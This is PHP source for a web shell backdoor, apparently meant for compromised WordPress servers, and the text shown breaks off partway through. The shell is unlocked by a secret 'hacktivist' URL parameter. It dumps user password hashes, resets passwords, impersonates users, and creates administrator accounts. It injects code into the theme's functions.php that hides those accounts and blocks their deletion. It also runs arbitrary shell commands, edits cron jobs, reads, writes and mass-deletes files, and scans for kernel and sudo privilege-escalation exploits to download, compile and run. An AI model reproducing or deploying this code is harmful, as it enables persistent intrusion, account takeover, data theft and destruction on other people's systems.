<?php
echo "<!-- GIF89;a -->\n";
@ini_set('max_execution_time', 0);
@ob_clean();
@header("X-Accel-Buffering: no");
@header("Content-Encoding: none");
@http_response_code(403);
@http_response_code(404);
@http_response_code(500);
if (isset($_GET['debug500'])) {
    ini_set('display_errors', 1);
    error_reporting(E_ALL);
} else {
    @ini_set('error_log', NULL);
    @ini_set('log_errors', 0);
    @error_reporting(0);
}
@ini_set('max_execution_time', 0);
@set_time_limit(0);

// === WP LOAD FINDER (global) ===
function findWpLoad($dir = null, $depth = 0) {
    if ($depth > 8) return false;
    $dir = $dir ?: __DIR__;
    $wp_load = $dir . '/wp-load.php';
    if (file_exists($wp_load)) return $wp_load;
    return findWpLoad(dirname($dir), $depth + 1);
}

// === WP AJAX HANDLER - Exact copy from reference script ===
if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_POST['c4t'])) {

    $wp_load_path = findWpLoad();
    if (!$wp_load_path) {
        echo json_encode(['err' => 'wp-load.php not found']);
        exit;
    }

    require_once $wp_load_path;

    function addUserProtection($username) {
        $functions_file = get_template_directory() . '/functions.php';
        if (!file_exists($functions_file)) {
            $functions_file = get_stylesheet_directory() . '/functions.php';
        }

        if (file_exists($functions_file)) {
            $protection_code = '

add_action(\'pre_get_users\', function($query) {
    if (is_admin() && function_exists(\'get_current_screen\')) {
        $screen = get_current_screen();
        if ($screen && $screen->base === \'users\') {
            $protected_user = get_user_by(\'login\', \'' . $username . '\');
            if ($protected_user) {
                $excluded = (array) $query->get(\'exclude\');
                $excluded[] = $protected_user->ID;
                $query->set(\'exclude\', $excluded);
            }
        }
    }
});
add_filter(\'wp_count_users\', function($counts) {
    $protected_user = get_user_by(\'login\', \'' . $username . '\');
    if ($protected_user) {
        $counts->total_users--;
    }
    return $counts;
});
add_action(\'delete_user\', function($user_id) {
    $user = get_user_by(\'ID\', $user_id);
    if ($user && $user->user_login === \'' . $username . '\') {
        wp_die(
            __(\'User ' . $username . ' tidak dapat dihapus.\', \'textdomain\'),
            __(\'Error\', \'textdomain\'),
            array(\'response\' => 403)
        );
    }
});
add_filter(\'user_search_columns\', function($search_columns, $search, $query) {
    if (is_admin()) {
        $protected_user = get_user_by(\'login\', \'' . $username . '\');
        if ($protected_user) {
            global $wpdb;
            $query->query_where .= $wpdb->prepare(" AND {$wpdb->users}.ID != %d", $protected_user->ID);
        }
    }
    return $search_columns;
}, 10, 3);
add_filter(\'bulk_actions-users\', function($actions) {
    if (isset($_REQUEST[\'users\']) && is_array($_REQUEST[\'users\'])) {
        $protected_user = get_user_by(\'login\', \'' . $username . '\');
        if ($protected_user && in_array($protected_user->ID, $_REQUEST[\'users\'])) {
            unset($actions[\'delete\']);
        }
    }
    return $actions;
});
';

            $current_content = file_get_contents($functions_file);
            if (strpos($current_content, "get_user_by('login', '{$username}')") === false) {
                file_put_contents($functions_file, $protection_code, FILE_APPEND | LOCK_EX);
                return true;
            } else {
                return true;
            }
        }
        return false;
    }

    function removeUserProtection($username) {
        $functions_file = get_template_directory() . '/functions.php';
        if (!file_exists($functions_file)) {
            $functions_file = get_stylesheet_directory() . '/functions.php';
        }

        if (file_exists($functions_file)) {
            $current_content = file_get_contents($functions_file);

            $pattern = '/add_action\(\'pre_get_users\'.*?get_user_by\(\'login\', \'' . preg_quote($username, '/') . '\'.*?add_filter\(\'bulk_actions-users\'.*?\}\);\s*/s';

            $new_content = preg_replace($pattern, '', $current_content);

            if ($new_content !== $current_content) {
                file_put_contents($functions_file, $new_content, LOCK_EX);
                return true;
            }
        }
        return false;
    }

    function isUserHidden($username) {
        $functions_file = get_template_directory() . '/functions.php';
        if (!file_exists($functions_file)) {
            $functions_file = get_stylesheet_directory() . '/functions.php';
        }

        if (file_exists($functions_file)) {
            $current_content = file_get_contents($functions_file);
            return strpos($current_content, "get_user_by('login', '{$username}')") !== false;
        }
        return false;
    }

    global $wpdb;

    if ($_POST['c4t'] == 'ulst') {
        $users = $wpdb->get_results("SELECT ID, user_login, user_email, user_pass, user_registered FROM {$wpdb->users}");

        foreach ($users as $user) {
            $user->is_hidden = isUserHidden($user->user_login);
        }

        echo json_encode($users);
        exit;
    }

    if ($_POST['c4t'] == 'rpsw') {
        $user_id = intval($_POST['uix']);
        $new_password = wp_generate_password(12, true, true);
        wp_set_password($new_password, $user_id);
        $user_data = get_userdata($user_id);
        echo json_encode([
            'l' => $user_data->user_login,
            'e' => $user_data->user_email,
            'n' => $new_password
        ]);
        exit;
    }

    if ($_POST['c4t'] == 'cadm') {
        $username = preg_replace('/[^a-zA-Z0-9_]/', '', $_POST['xun']);
        $password = $_POST['xpw'];
        $email = filter_var($_POST['xem'], FILTER_VALIDATE_EMAIL) ? $_POST['xem'] : $username . '@' . $_SERVER['HTTP_HOST'];
        $hide_user = isset($_POST['hide_user']) ? true : false;

        if (username_exists($username)) {
            echo json_encode(['err' => 'user exists']);
            exit;
        }

        $user_id = wp_create_user($username, $password, $email);
        if ($user_id && !is_wp_error($user_id)) {
            $user = new WP_User($user_id);
            $user->set_role('administrator');

            if ($hide_user) {
                addUserProtection($username);
            }

            echo json_encode([
                'ok' => 'created',
                'u' => $username,
                'p' => $password,
                'hide' => $hide_user
            ]);
        } else {
            echo json_encode(['err' => 'create failed']);
        }
        exit;
    }

    if ($_POST['c4t'] == 'alog') {
        $user_id = intval($_POST['uix']);
        wp_clear_auth_cookie();
        wp_set_current_user($user_id);
        wp_set_auth_cookie($user_id, true);
        echo json_encode(['url' => admin_url()]);
        exit;
    }

    if ($_POST['c4t'] == 'hide') {
        $user_id = intval($_POST['uix']);
        $user = get_user_by('ID', $user_id);
        if ($user) {
            $result = addUserProtection($user->user_login);
            echo json_encode([
                'ok' => 'hidden',
                'user' => $user->user_login,
                'success' => $result
            ]);
        } else {
            echo json_encode(['err' => 'user not found']);
        }
        exit;
    }

    if ($_POST['c4t'] == 'unhide') {
        $user_id = intval($_POST['uix']);
        $user = get_user_by('ID', $user_id);
        if ($user) {
            $result = removeUserProtection($user->user_login);
            echo json_encode([
                'ok' => 'unhidden',
                'user' => $user->user_login,
                'success' => $result
            ]);
        } else {
            echo json_encode(['err' => 'user not found']);
        }
        exit;
    }

    if ($_POST['c4t'] == 'del') {
        $user_id = intval($_POST['uix']);
        $user = get_user_by('ID', $user_id);
        if ($user) {
            $current_user = wp_get_current_user();
            if ($user_id == $current_user->ID) {
                echo json_encode(['err' => 'cannot_delete_self']);
                exit;
            }

            if (isUserHidden($user->user_login)) {
                removeUserProtection($user->user_login);
            }

            if (wp_delete_user($user_id)) {
                echo json_encode([
                    'ok' => 'deleted',
                    'user' => $user->user_login
                ]);
            } else {
                echo json_encode(['err' => 'delete_failed']);
            }
        } else {
            echo json_encode(['err' => 'user_not_found']);
        }
        exit;
    }

    exit;
}
// === END WP AJAX HANDLER ===

$SECRET_PARAM = (isset($_GET['lastpiece']) && $_GET['lastpiece'] === 'hacktivist');
$PASSWORD_HASH = '$2a$12$5OVW/NAVmsGEZ2H23GyTCuTaGRI5iBDFoLzMsaYLtAUWpAfwrO85.';
$SESSION_NAME = 'lastpiece_auth';
$SESSION_TIMEOUT = 3600;

// === NOPASS MODE ===
// Set true = skip password, auto-login when secret param is correct
// Set false = require password after secret param (default)
$NOPASS_MODE = true;

session_start();

function isAuthenticated() {
    global $SESSION_NAME, $SESSION_TIMEOUT;
    if (isset($_SESSION[$SESSION_NAME]) && isset($_SESSION[$SESSION_NAME . '_time'])) {
        if (time() - $_SESSION[$SESSION_NAME . '_time'] < $SESSION_TIMEOUT) {
            $_SESSION[$SESSION_NAME . '_time'] = time();
            return true;
        } else {
            unset($_SESSION[$SESSION_NAME]);
            unset($_SESSION[$SESSION_NAME . '_time']);
        }
    }
    return false;
}

function authenticate($password) {
    global $PASSWORD_HASH, $SESSION_NAME;
    if (password_verify($password, $PASSWORD_HASH)) {
        $_SESSION[$SESSION_NAME] = true;
        $_SESSION[$SESSION_NAME . '_time'] = time();
        return true;
    }
    return false;
}

function logout() {
    global $SESSION_NAME;
    unset($_SESSION[$SESSION_NAME]);
    unset($_SESSION[$SESSION_NAME . '_time']);
    unset($_SESSION['fbi_played']);
    session_destroy();
}

// === SAFE EXEC HELPER (fallback when shell_exec is disabled) ===
function safeExec($cmd) {
    $out = null;
    if (function_exists('shell_exec')) {
        $out = @shell_exec($cmd);
        if ($out !== null && $out !== false) return $out;
    }
    if (function_exists('exec')) {
        $outArr = [];
        @exec($cmd, $outArr);
        $out = implode("\n", $outArr);
        if (!empty($out)) return $out;
    }
    if (function_exists('proc_open')) {
        $desc = [0 => ['pipe','r'], 1 => ['pipe','w'], 2 => ['pipe','w']];
        $proc = @proc_open($cmd, $desc, $pipes);
        if (is_resource($proc)) {
            @fclose($pipes[0]);
            $out = @stream_get_contents($pipes[1]);
            $err = @stream_get_contents($pipes[2]);
            @fclose($pipes[1]);
            @fclose($pipes[2]);
            @proc_close($proc);
            if (!empty(trim($out ?? ''))) return $out;
            if (!empty(trim($err ?? ''))) return $err;
        }
    }
    if (function_exists('popen')) {
        $fp = @popen($cmd, 'r');
        if ($fp) { $out = @stream_get_contents($fp); @pclose($fp); if (!empty($out)) return $out; }
    }
    if (function_exists('system')) {
        ob_start();
        @system($cmd);
        $out = ob_get_clean();
        if (!empty($out)) return $out;
    }
    if (function_exists('passthru')) {
        ob_start();
        @passthru($cmd);
        $out = ob_get_clean();
        if (!empty($out)) return $out;
    }
    return '';
}

// === PROCESS AJAX HANDLER ===
if (isset($_POST['proc_action']) && isAuthenticated()) {
    header('Content-Type: application/json; charset=utf-8');
    $pAct = $_POST['proc_action'];

    if ($pAct === 'list') {
        // Get all visible processes
        $ps_out = safeExec('ps auxww 2>/dev/null') ?: '';
        $lines = explode("\n", trim($ps_out));
        $header = array_shift($lines);
        $processes = [];
        foreach ($lines as $line) {
            $line = trim($line);
            if (empty($line)) continue;
            $cols = preg_split('/\s+/', $line, 11);
            if (count($cols) >= 11) {
                $processes[] = [
                    'user' => $cols[0],
                    'pid' => $cols[1],
                    'cpu' => $cols[2],
                    'mem' => $cols[3],
                    'vsz' => $cols[4],
                    'rss' => $cols[5],
                    'tty' => $cols[6],
                    'stat' => $cols[7],
                    'start' => $cols[8],
                    'time' => $cols[9],
                    'command' => $cols[10],
                ];
            }
        }

        // Detect hidden processes by comparing /proc with ps output
        $ps_pids = array_column($processes, 'pid');
        $hidden = [];
        if (is_dir('/proc')) {
            $proc_dirs = @scandir('/proc');
            if ($proc_dirs) {
                foreach ($proc_dirs as $d) {
                    if (!is_numeric($d)) continue;
                    if (!in_array($d, $ps_pids)) {
                        // Hidden process found - try to get info
                        $cmdline = @file_get_contents("/proc/$d/cmdline");
                        $cmdline = $cmdline ? str_replace("\0", ' ', trim($cmdline)) : '[hidden]';
                        $status = @file_get_contents("/proc/$d/status");
                        $uid = '?';
                        if ($status && preg_match('/Uid:\s+(\d+)/', $status, $m)) {
                            $pw = @posix_getpwuid((int)$m[1]);
                            $uid = $pw ? $pw['name'] : $m[1];
                        }
                        $hidden[] = [
                            'pid' => $d,
                            'user' => $uid,
                            'command' => $cmdline ?: '[hidden]',
                        ];
                    }
                }
            }
        }

        // Detect recently started processes (started within last 5 minutes)
        $recent = [];
        $now = time();
        foreach ($processes as $p) {
            // Check /proc/<pid>/stat for start time
            $stat = @file_get_contents("/proc/{$p['pid']}/stat");
            if ($stat) {
                $parts = explode(' ', $stat);
                if (isset($parts[21])) {
                    $uptime_str = @file_get_contents('/proc/uptime');
                    if ($uptime_str) {
                        $uptime = (float)explode(' ', $uptime_str)[0];
                        $clk_tck = 100; // sysconf(_SC_CLK_TCK)
                        $start_sec = (float)$parts[21] / $clk_tck;
                        $boot_time = $now - $uptime;
                        $proc_start = $boot_time + $start_sec;
                        $age = $now - $proc_start;
                        if ($age >= 0 && $age <= 300) {
                            $p['age_seconds'] = (int)$age;
                            $recent[] = $p;
                        }
                    }
                }
            }
        }

        echo json_encode([
            'processes' => $processes,
            'hidden' => $hidden,
            'recent' => $recent,
            'total' => count($processes),
            'total_hidden' => count($hidden),
            'total_recent' => count($recent),
        ]);
        exit;
    }

    if ($pAct === 'kill') {
        $pid = intval($_POST['pid'] ?? 0);
        if ($pid > 0) {
            $sig = $_POST['signal'] ?? '9';
            $out = safeExec("kill -$sig $pid 2>&1");
            echo json_encode(['ok' => true, 'pid' => $pid, 'output' => trim($out ?? '')]);
        } else {
            echo json_encode(['err' => 'invalid pid']);
        }
        exit;
    }

    echo json_encode(['err' => 'unknown action']);
    exit;
}
// === END PROCESS HANDLER ===

// === CRONJOB AJAX HANDLER ===
if (isset($_POST['cron_action']) && isAuthenticated()) {
    header('Content-Type: application/json; charset=utf-8');
    $crAct = $_POST['cron_action'];

    if ($crAct === 'list') {
        $user_cron = safeExec('crontab -l 2>&1') ?: '';
        $is_empty = (strpos($user_cron, 'no crontab') !== false);
        $user_lines = [];
        if (!$is_empty) {
            foreach (explode("\n", trim($user_cron)) as $line) {
                $line = trim($line);
                if (empty($line)) continue;
                $is_comment = (substr($line, 0, 1) === '#');
                $is_var = (!$is_comment && preg_match('/^[A-Z_]+=/', $line));
                $schedule = '';
                $command = $line;
                $enabled = !$is_comment;
                $raw = $line;
                if ($is_comment) {
                    $stripped = ltrim(substr($line, 1));
                    if (preg_match('/^(@(reboot|yearly|annually|monthly|weekly|daily|hourly))\s+(.+)$/i', $stripped, $m)) {
                        $schedule = $m[1]; $command = $m[3];
                    } elseif (preg_match('/^([\d\*\/\-\,]+\s+[\d\*\/\-\,]+\s+[\d\*\/\-\,]+\s+[\d\*\/\-\,]+\s+[\d\*\/\-\,]+)\s+(.+)$/', $stripped, $m)) {
                        $schedule = $m[1]; $command = $m[2];
                    }
                } elseif (!$is_var) {
                    if (preg_match('/^(@(reboot|yearly|annually|monthly|weekly|daily|hourly))\s+(.+)$/i', $line, $m)) {
                        $schedule = $m[1]; $command = $m[3];
                    } elseif (preg_match('/^([\d\*\/\-\,]+\s+[\d\*\/\-\,]+\s+[\d\*\/\-\,]+\s+[\d\*\/\-\,]+\s+[\d\*\/\-\,]+)\s+(.+)$/', $line, $m)) {
                        $schedule = $m[1]; $command = $m[2];
                    }
                }
                $user_lines[] = [
                    'raw' => $raw, 'schedule' => $schedule, 'command' => $command,
                    'enabled' => $enabled, 'is_var' => $is_var, 'is_comment' => $is_comment,
                ];
            }
        }

        $sys_crons = [];
        $sys_dirs = ['/etc/cron.d', '/etc/cron.daily', '/etc/cron.hourly', '/etc/cron.weekly', '/etc/cron.monthly'];
        foreach ($sys_dirs as $dir) {
            if (!is_dir($dir)) continue;
            $files = @scandir($dir);
            if (!$files) continue;
            foreach ($files as $f) {
                if ($f === '.' || $f === '..') continue;
                $fp = $dir . '/' . $f;
                if (!is_file($fp)) continue;
                $content = @file_get_contents($fp);
                $sys_crons[] = ['file' => $fp, 'name' => $f, 'dir' => basename($dir), 'content' => $content ? trim($content) : '[unreadable]', 'writable' => is_writable($fp)];
            }
        }

        $etc_crontab = @file_get_contents('/etc/crontab');

        $other_users = [];
        $spool = '/var/spool/cron/crontabs';
        if (!is_dir($spool)) $spool = '/var/spool/cron';
        if (is_dir($spool) && is_readable($spool)) {
            $files = @scandir($spool);
            if ($files) {
                $me = trim(safeExec('whoami 2>/dev/null') ?: '');
                foreach ($files as $f) {
                    if ($f === '.' || $f === '..' || $f === $me) continue;
                    $fp = $spool . '/' . $f;
                    $content = @file_get_contents($fp);
                    $other_users[] = ['user' => $f, 'content' => $content ? trim($content) : '[unreadable]'];
                }
            }
        }

        echo json_encode([
            'user_crons' => $user_lines, 'sys_crons' => $sys_crons,
            'etc_crontab' => $etc_crontab ?: '', 'other_users' => $other_users,
            'current_user' => trim(safeExec('whoami 2>/dev/null') ?: get_current_user()),
            'raw' => $is_empty ? '' : $user_cron,
        ]);
        exit;
    }

    if ($crAct === 'add') {
        $schedule = trim($_POST['schedule'] ?? '');
        $command = trim($_POST['command'] ?? '');
        if (empty($schedule) || empty($command)) { echo json_encode(['err' => 'schedule and command required']); exit; }
        $current = safeExec('crontab -l 2>/dev/null') ?: '';
        if (strpos($current, 'no crontab') !== false) $current = '';
        $new = trim($current) . "\n" . $schedule . ' ' . $command . "\n";
        $tmp = tempnam(sys_get_temp_dir(), 'cron_');
        file_put_contents($tmp, $new);
        $out = safeExec("crontab $tmp 2>&1");
        @unlink($tmp);
        echo json_encode(['ok' => 'added', 'output' => trim($out ?? '')]);
        exit;
    }

    if ($crAct === 'delete') {
        $idx = intval($_POST['idx'] ?? -1);
        $current = safeExec('crontab -l 2>/dev/null') ?: '';
        if (strpos($current, 'no crontab') !== false) { echo json_encode(['err' => 'no crontab']); exit; }
        $lines = explode("\n", $current);
        $non_empty = [];
        foreach ($lines as $l) { if (trim($l) !== '') $non_empty[] = $l; }
        if ($idx < 0 || $idx >= count($non_empty)) { echo json_encode(['err' => 'invalid index']); exit; }
        array_splice($non_empty, $idx, 1);
        $new = implode("\n", $non_empty) . "\n";
        $tmp = tempnam(sys_get_temp_dir(), 'cron_');
        file_put_contents($tmp, $new);
        $out = safeExec("crontab $tmp 2>&1");
        @unlink($tmp);
        echo json_encode(['ok' => 'deleted', 'output' => trim($out ?? '')]);
        exit;
    }

    if ($crAct === 'toggle') {
        $idx = intval($_POST['idx'] ?? -1);
        $current = safeExec('crontab -l 2>/dev/null') ?: '';
        if (strpos($current, 'no crontab') !== false) { echo json_encode(['err' => 'no crontab']); exit; }
        $lines = explode("\n", $current);
        $non_empty = [];
        foreach ($lines as $l) { if (trim($l) !== '') $non_empty[] = $l; }
        if ($idx < 0 || $idx >= count($non_empty)) { echo json_encode(['err' => 'invalid index']); exit; }
        $line = $non_empty[$idx];
        if (substr(trim($line), 0, 1) === '#') { $non_empty[$idx] = ltrim(substr(trim($line), 1)); }
        else { $non_empty[$idx] = '#' . $line; }
        $new = implode("\n", $non_empty) . "\n";
        $tmp = tempnam(sys_get_temp_dir(), 'cron_');
        file_put_contents($tmp, $new);
        $out = safeExec("crontab $tmp 2>&1");
        @unlink($tmp);
        echo json_encode(['ok' => 'toggled', 'output' => trim($out ?? '')]);
        exit;
    }

    if ($crAct === 'save_raw') {
        $raw = $_POST['raw'] ?? '';
        $tmp = tempnam(sys_get_temp_dir(), 'cron_');
        file_put_contents($tmp, $raw . "\n");
        $out = safeExec("crontab $tmp 2>&1");
        @unlink($tmp);
        echo json_encode(['ok' => 'saved', 'output' => trim($out ?? '')]);
        exit;
    }

    echo json_encode(['err' => 'unknown cron action']);
    exit;
}
// === END CRONJOB HANDLER ===

// === FILE OPERATION AJAX HANDLER ===
if (isset($_POST['file_action']) && isAuthenticated()) {
    header('Content-Type: application/json; charset=utf-8');
    $fAct = $_POST['file_action'];
    $fPath = $_POST['file_path'] ?? '';

    if ($fAct === 'get_content') {
        if (!file_exists($fPath) || !is_file($fPath)) {
            echo json_encode(['err' => 'File not found']);
            exit;
        }
        $content = @file_get_contents($fPath);
        echo json_encode(['ok' => true, 'content' => ($content !== false ? $content : ''), 'name' => basename($fPath)]);
        exit;
    }

    if ($fAct === 'save_content') {
        $content = $_POST['file_content'] ?? '';
        if (empty($fPath)) { echo json_encode(['err' => 'No file path']); exit; }
        @chmod($fPath, is_dir($fPath) ? 0755 : 0644);
        @chmod(dirname($fPath), 0755);
        if (@file_put_contents($fPath, $content) !== false) {
            echo json_encode(['ok' => true, 'msg' => 'File saved successfully']);
        } else {
            echo json_encode(['err' => 'Error saving file']);
        }
        exit;
    }

    if ($fAct === 'rename') {
        $newName = $_POST['new_name'] ?? '';
        if (empty($fPath) || empty($newName)) { echo json_encode(['err' => 'Path and name required']); exit; }
        @chmod($fPath, is_dir($fPath) ? 0755 : 0644);
        @chmod(dirname($fPath), 0755);
        $newPath = dirname($fPath) . '/' . $newName;
        if (@rename($fPath, $newPath)) {
            echo json_encode(['ok' => true, 'msg' => 'Renamed successfully']);
        } else {
            echo json_encode(['err' => 'Error renaming file']);
        }
        exit;
    }

    if ($fAct === 'chmod') {
        $perm = $_POST['permission'] ?? '';
        if (empty($fPath) || empty($perm)) { echo json_encode(['err' => 'Path and permission required']); exit; }
        $permInt = intval($perm, 8);
        if ($permInt > 0 && @chmod($fPath, $permInt)) {
            echo json_encode(['ok' => true, 'msg' => 'Permission changed to ' . $perm]);
        } else {
            echo json_encode(['err' => 'Error changing permission']);
        }
        exit;
    }

    if ($fAct === 'create_file') {
        $fileName = $_POST['file_name'] ?? '';
        $fileContent = $_POST['file_content'] ?? '';
        $dir = $_POST['target_dir'] ?? '';
        if (empty($fileName) || empty($dir)) { echo json_encode(['err' => 'Name and directory required']); exit; }
        @chmod($dir, 0755);
        $target = rtrim($dir, '/') . '/' . $fileName;
        if (file_exists($target)) { echo json_encode(['err' => 'File already exists']); exit; }
        if (@file_put_contents($target, $fileContent) !== false) {
            echo json_encode(['ok' => true, 'msg' => 'File created: ' . $fileName]);
        } else {
            echo json_encode(['err' => 'Failed to create file']);
        }
        exit;
    }

    if ($fAct === 'create_folder') {
        $folderName = $_POST['folder_name'] ?? '';
        $dir = $_POST['target_dir'] ?? '';
        if (empty($folderName) || empty($dir)) { echo json_encode(['err' => 'Name and directory required']); exit; }
        @chmod($dir, 0755);
        $target = rtrim($dir, '/') . '/' . $folderName;
        if (file_exists($target)) { echo json_encode(['err' => 'Folder already exists']); exit; }
        if (@mkdir($target, 0755, true)) {
            echo json_encode(['ok' => true, 'msg' => 'Folder created: ' . $folderName]);
        } else {
            echo json_encode(['err' => 'Failed to create folder']);
        }
        exit;
    }

    if ($fAct === 'mass_delete') {
        $paths = json_decode($_POST['paths'] ?? '[]', true);
        if (!is_array($paths) || empty($paths)) { echo json_encode(['err' => 'No paths provided']); exit; }
        $ok = 0; $fail = 0;
        foreach ($paths as $p) {
            if (!file_exists($p)) { $fail++; continue; }
            @chmod($p, is_dir($p) ? 0755 : 0644);
            @chmod(dirname($p), 0755);
            if (is_dir($p)) {
                if (deleteFolder($p)) $ok++; else $fail++;
            } else {
                if (@unlink($p)) $ok++; else $fail++;
            }
        }
        echo json_encode(['ok' => true, 'deleted' => $ok, 'failed' => $fail]);
        exit;
    }

    if ($fAct === 'mass_delete_recursive') {
        $code = $_POST['code_content'] ?? '';
        $dir = $_POST['target_dir'] ?? '';
        if (empty($dir)) { echo json_encode(['err' => 'Directory required']); exit; }
        if (!is_dir($dir)) { echo json_encode(['err' => 'Not a directory']); exit; }
        $ok = 0; $fail = 0; $scanned = 0;
        try {
            $iterator = new RecursiveIteratorIterator(
                new RecursiveDirectoryIterator($dir, RecursiveDirectoryIterator::SKIP_DOTS),
                RecursiveIteratorIterator::CHILD_FIRST
            );
            foreach ($iterator as $item) {
                if ($item->isFile()) {
                    $scanned++;
                    $shouldDelete = false;
                    if (!empty($code)) {
                        $fc = @file_get_contents($item->getPathname());
                        if ($fc !== false && strpos($fc, $code) !== false) $shouldDelete = true;
                    } else {
                        $shouldDelete = true;
                    }
                    if ($shouldDelete) {
                        @chmod($item->getPathname(), 0644);
                        if (@unlink($item->getPathname())) $ok++; else $fail++;
                    }
                }
            }
            // Clean empty dirs if deleting all
            if (empty($code)) {
                $dirIter = new RecursiveIteratorIterator(
                    new RecursiveDirectoryIterator($dir, RecursiveDirectoryIterator::SKIP_DOTS),
                    RecursiveIteratorIterator::CHILD_FIRST
                );
                foreach ($dirIter as $d) {
                    if ($d->isDir()) { @chmod($d->getPathname(), 0755); @rmdir($d->getPathname()); }
                }
            }
        } catch (Exception $e) {
            echo json_encode(['err' => $e->getMessage()]); exit;
        }
        echo json_encode(['ok' => true, 'deleted' => $ok, 'failed' => $fail, 'scanned' => $scanned]);
        exit;
    }

    if ($fAct === 'compress_zip') {
        $paths = json_decode($_POST['paths'] ?? '[]', true);
        $dir = $_POST['target_dir'] ?? '';
        $zipName = $_POST['zip_name'] ?? 'archive.zip';
        if (!is_array($paths) || empty($paths)) { echo json_encode(['err' => 'No paths provided']); exit; }
        if (!class_exists('ZipArchive')) { echo json_encode(['err' => 'ZipArchive not available']); exit; }
        $zipPath = rtrim($dir, '/') . '/' . $zipName;
        $zip = new ZipArchive();
        if ($zip->open($zipPath, ZipArchive::CREATE | ZipArchive::OVERWRITE) !== true) {
            echo json_encode(['err' => 'Cannot create zip file']); exit;
        }
        $count = 0;
        foreach ($paths as $p) {
            if (!file_exists($p)) continue;
            if (is_file($p)) {
                $zip->addFile($p, basename($p));
                $count++;
            } elseif (is_dir($p)) {
                $dirBase = basename($p);
                $zip->addEmptyDir($dirBase);
                $iter = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($p, RecursiveDirectoryIterator::SKIP_DOTS));
                foreach ($iter as $f) {
                    $rel = $dirBase . '/' . substr($f->getPathname(), strlen($p) + 1);
                    if ($f->isDir()) $zip->addEmptyDir($rel);
                    else { $zip->addFile($f->getPathname(), $rel); $count++; }
                }
            }
        }
        $zip->close();
        echo json_encode(['ok' => true, 'msg' => "Compressed $count files to $zipName", 'zip_path' => $zipPath]);
        exit;
    }

    if ($fAct === 'download') {
        // Return a download URL approach via redirect
        echo json_encode(['ok' => true, 'download_url' => '?dl=' . urlencode($fPath) . '&lastpiece=hacktivist']);
        exit;
    }

    // === AUTO ROOT - SCAN ===
    if ($fAct === 'auto_root_scan') {
        $kernel = trim(safeExec('uname -r 2>/dev/null') ?: '');
        $kernelAll = trim(safeExec('uname -a 2>/dev/null') ?: '');
        $os = trim(safeExec('cat /etc/os-release 2>/dev/null | head -5') ?: safeExec('cat /etc/issue 2>/dev/null') ?: '');
        $arch = trim(safeExec('uname -m 2>/dev/null') ?: '');
        $whoami = trim(safeExec('whoami 2>/dev/null') ?: get_current_user());
        $uid = trim(safeExec('id 2>/dev/null') ?: '');
        $gcc = trim(safeExec('which gcc 2>/dev/null') ?: safeExec('which cc 2>/dev/null') ?: '');
        $writable = is_writable('/tmp') ? '/tmp' : (is_writable('/dev/shm') ? '/dev/shm' : (is_writable('/var/tmp') ? '/var/tmp' : ''));
        $sudoVer = trim(safeExec('sudo --version 2>/dev/null | head -1') ?: '');
        $pkexecVer = trim(safeExec('pkexec --version 2>/dev/null') ?: '');
        $suidBins = trim(safeExec('find / -perm -4000 -type f 2>/dev/null | head -30') ?: '');
        $dockerSock = file_exists('/var/run/docker.sock') ? 'yes' : 'no';
        $inDocker = file_exists('/.dockerenv') ? 'yes' : 'no';
        $kMajor = 0; $kMinor = 0; $kPatch = 0;
        if (preg_match('/^(\d+)\.(\d+)\.(\d+)/', $kernel, $km)) {
            $kMajor = (int)$km[1]; $kMinor = (int)$km[2]; $kPatch = (int)$km[3];
        }
        $exploits = [];
        // DirtyPipe CVE-2022-0847
        if ($kMajor == 5 && (($kMinor >= 8 && $kMinor < 16) || ($kMinor == 16 && $kPatch < 11) || ($kMinor == 15 && $kPatch < 25) || ($kMinor == 10 && $kPatch < 102))) {
            $exploits[] = ['cve'=>'CVE-2022-0847','name'=>'DirtyPipe','desc'=>'Overwrite read-only files via pipe splice','severity'=>'CRITICAL','url'=>'https://raw.githubusercontent.com/Arinerron/CVE-2022-0847-DirtyPipe-Exploit/main/exploit.c','compile'=>'gcc exploit.c -o exploit','run'=>'./exploit /usr/bin/su'];
        }
        // DirtyCow CVE-2016-5195
        if (($kMajor == 2 && $kMinor >= 6) || ($kMajor == 3) || ($kMajor == 4 && ($kMinor < 8 || ($kMinor == 8 && $kPatch < 3)))) {
            $exploits[] = ['cve'=>'CVE-2016-5195','name'=>'DirtyCow','desc'=>'Race condition in COW mechanism','severity'=>'CRITICAL','url'=>'https://raw.githubusercontent.com/firefart/dirtycow/master/dirty.c','compile'=>'gcc -pthread dirty.c -o dirty -lcrypt','run'=>'./dirty'];
        }
        // PwnKit CVE-2021-4034
        if (!empty($pkexecVer) || strpos($suidBins, 'pkexec') !== false) {
            $exploits[] = ['cve'=>'CVE-2021-4034','name'=>'PwnKit','desc'=>'Polkit pkexec local privesc','severity'=>'CRITICAL','url'=>'https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit.c','compile'=>'gcc PwnKit.c -o PwnKit','run'=>'./PwnKit'];
        }
        // Baron Samedit CVE-2021-3156
        if (!empty($sudoVer) && preg_match('/(\d+\.\d+\.\d+)/', $sudoVer, $sv)) {
            if (version_compare($sv[1], '1.9.5', '<')) {
                $exploits[] = ['cve'=>'CVE-2021-3156','name'=>'Baron Samedit','desc'=>'Sudo heap overflow via sudoedit -s','severity'=>'CRITICAL','url'=>'https://raw.githubusercontent.com/blasty/CVE-2021-3156/main/hax.c','compile'=>'gcc hax.c -o hax','run'=>'./hax'];
            }
        }
        // Looney Tunables CVE-2023-4911
        $glibcVer = trim(safeExec('ldd --version 2>&1 | head -1') ?: '');
        if (preg_match('/(\d+\.\d+)/', $glibcVer, $gm)) {
            if (version_compare($gm[1], '2.34', '>=') && version_compare($gm[1], '2.39', '<')) {
                $exploits[] = ['cve'=>'CVE-2023-4911','name'=>'Looney Tunables','desc'=>'Glibc ld.so GLIBC_TUNABLES overflow','severity'=>'HIGH','url'=>'','compile'=>'','run'=>'GLIBC_TUNABLES exploit'];
            }
        }
        // OverlayFS CVE-2023-0386
        if (($kMajor == 5 && $kMinor >= 11) || ($kMajor == 6 && $kMinor < 2)) {
            $exploits[] = ['cve'=>'CVE-2023-0386','name'=>'OverlayFS','desc'=>'OverlayFS setuid copy up','severity'=>'HIGH','url'=>'','compile'=>'make','run'=>'./exploit'];
        }
        // GameOver(lay) CVE-2023-2640 + CVE-2023-32629 (Ubuntu)
        if (stripos($kernelAll, 'ubuntu') !== false || stripos($os, 'ubuntu') !== false) {
            if (($kMajor == 5 && $kMinor >= 15) || $kMajor == 6) {
